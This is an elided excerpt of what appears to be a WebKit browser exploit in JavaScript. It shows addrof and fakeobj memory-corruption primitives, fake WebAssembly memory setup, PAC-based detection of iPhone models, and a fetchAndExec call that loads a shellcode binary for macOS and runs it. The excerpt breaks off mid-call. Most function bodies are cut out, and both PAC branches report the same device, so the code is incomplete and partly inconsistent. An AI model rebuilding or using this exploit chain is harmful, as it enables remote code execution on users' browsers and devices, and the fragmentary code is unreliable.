...
function addrof(val) {
    ...
    alert("[-] Addrof didn't work. Prepare for WebContent to crash or other strange stuff to happen...");
    throw "See above";
}
...
function fakeobj(val) {
    ...
    alert("[-] Fakeobj didn't work. Prepare for WebContent to crash or other strange stuff to happen...");
    throw "See above";
}
...
function pwn() 
{
    ...
    alert("[+] Fake Wasm Memory @ " + wasmBufferAddr);
    ...
    alert("[+] Fake Wasm Internal Memory @ " + wasmMemAddr);
    ...
    alert("[+] Real Wasm Internal Memory @ " + realWasmInternalMemAddr);
    ...
    alert("[+] Cleanup done, the Garbage Collector may run now");
    ...
    if (hasPAC) {
        alert("[*] This device is using PAC -> it is an iPhone XS (max) or iPhone XR")
    }

    if (!hasPAC) {
    	alert("[*] This device isn't using PAC -> it is an iPhone XS (max) or iPhone XR")
    }
    ...
    if (detectOS() === "macOS") {
        fetchAndExec("/memory/memory_macOS.bin", true, function (buffer, shellcodeFunc, rwxMemAddr) {
